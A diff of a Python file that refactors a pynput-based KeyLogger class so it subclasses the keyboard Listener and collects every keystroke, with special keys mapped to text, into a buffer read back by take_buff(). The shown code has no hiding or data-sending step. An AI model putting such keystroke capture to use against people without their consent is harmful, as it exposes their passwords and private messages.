@@ -1,28 +1,31 @@
-from pynput.keyboard import Listener
+from sys import implementation
+from pynput.keyboard import Listener, Controller
+import threading
 
-class KeyLogger:
-    def __init__(self, on_key_press_listener = None):
-        self.listener = None
-        self.on_key_press_listener = on_key_press_listener
+KeyMap = {"space": " ",
+          "enter": "\n",
+          "shift": "",
+          "ctrl_r": "",
+          "ctrl_l": "",
+          "backspace": ""}
 
-    def start(self):
-        def on_press(key):
-            key = str(key)
-            if (key.startswith("Key.")): key = key[4:]
-            else: key = key.strip('\'')   
-            if (self.on_key_press_listener):
-                self.on_key_press_listener(key)
-            
-        self.listener = Listener(on_press=on_press)
-        self.listener.start()
-
-    def stop(self):
-        self.listener.stop()
-
-if __name__ == "__main__":
-    keylogger = KeyLogger()
-    keylogger.start()
-    import time
-    time.sleep(50)
-    keylogger.stop()
-
+class KeyLogger(Listener):
+    def __init__(self):
+        Listener.__init__(self)
+        self.on_press = self.__on_press_handler
+        self.lock = threading.Lock()
+        self.__buff = ""
+        
+    def __on_press_handler(self, key):
+        key = str(key)
+        if (key.startswith("Key.")): 
+            key = key[4:]
+            if key in KeyMap: key = KeyMap[key]
+            else: key = f'[{key}]'
+        else: key = key.strip('\'')
+        self.__buff += str(key)
+    
+    def take_buff(self):
+        s = self.__buff
+        self.__buff = ""
+        return s
